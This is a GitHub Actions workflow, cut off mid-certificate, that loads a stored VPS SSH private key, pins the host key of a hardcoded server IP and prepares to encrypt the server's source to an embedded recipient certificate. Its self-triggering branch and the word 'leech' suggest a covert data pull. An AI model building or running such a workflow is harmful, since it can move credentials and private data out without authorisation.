name: Owner private leech manuscript encrypted recovery
on:
  push:
    branches: ['owner/leech-private-transfer-20261029']
    paths: ['.github/workflows/owner-leech-private-transfer-20261029.yml']
permissions: {contents: read}
jobs:
  recover-encrypted-source:
    runs-on: ubuntu-24.04
    timeout-minutes: 12
    steps:
      - name: Read original VPS source without any server write and encrypt in transit
        shell: bash
        env:
          VPS_KEY: ${{ secrets.VPS_SSH_PRIVATE_KEY }}
        run: |
          set -euo pipefail
          umask 077
          test -n "${VPS_KEY:-}"
          work="$RUNNER_TEMP/owner-leech-export"
          install -d -m 700 "$work"
          trap 'rm -f -- "$work/key" "$work/recipient.crt"' EXIT
          printf '%s' "$VPS_KEY" | python3 -c 'import sys; s=sys.stdin.read(); print(s.replace("\r\n","\n").replace("\r","").replace("\\n","\n").rstrip()+"\n",end="")' > "$work/key"
          chmod 600 "$work/key"
          ssh-keygen -y -P '' -f "$work/key" > /dev/null
          ssh-keyscan -T 10 -t rsa 178.239.147.150 > "$work/known" 2>/dev/null
          test "$(ssh-keygen -lf "$work/known" -E sha256 | awk '{print $2}' | sort -u)" = 'SHA256:AYdzF3K5uSwAXElE1w/dKo04iT2BbMGwHbRA2Cu4rrs'
          cat > "$work/recipient.crt" <<'PUBLIC_CERT'
          -----BEGIN CERTIFICATE-----
          MIIEOzCCAqOgAwIBAgIUGXUBGM6JTgdoIMkmtWZ6QXpjuigwDQYJKoZIhvcNAQEL
